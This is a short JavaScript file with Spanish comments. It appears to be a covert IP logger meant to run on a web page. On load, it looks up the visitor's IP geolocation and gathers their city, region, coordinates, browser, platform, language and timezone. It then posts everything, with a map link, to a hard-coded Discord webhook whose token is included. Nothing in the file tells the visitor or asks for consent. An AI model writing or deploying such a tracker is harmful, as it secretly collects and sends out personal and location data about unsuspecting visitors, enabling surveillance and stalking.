const webhookURL = "https://discord.com/api/webhooks/1369716089017204836/b6gKjUH0MumEhVNgVbrZYxrBUb3L9NRccct5ia5TlnQ9v-dLJPIBd131hxxaGWaDTivc";

// Obtener info desde ipapi.co
async function getIPInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        return await response.json();
    } catch (error) {
        console.error("Error al obtener IP info:", error);
        return null;
    }
}

// Generar link a OpenStreetMap
function getMapLink(lat, lon) {
    return `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=13/${lat}/${lon}`;
}

// Enviar datos a Discord
async function sendToDiscord(info) {
    const mapURL = getMapLink(info.latitude, info.longitude);

    const payload = {
        content: `📥 **Nuevo visitante detectado**  
**🌐 IP:** ${info.ip}  
**🌍 País:** ${info.country_name}  
**🏙️ Ciudad:** ${info.city}  
**📌 Región:** ${info.region}  
**🛰️ Lat/Lon:** ${info.latitude}, ${info.longitude}  
**🧭 Navegador:** ${navigator.userAgent}  
**💻 Sistema:** ${navigator.platform}  
**🌐 Idioma:** ${navigator.language}  
**🕒 Zona horaria:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}  
📍 **Mapa:** ${mapURL}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Datos enviados a Discord");
        } else {
            console.error("Error al enviar a Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Fetch error:", error);
    }
}

// Ejecutar todo
async function main() {
    const info = await getIPInfo();
    if (info) {
        await sendToDiscord(info);
    }
}

main();
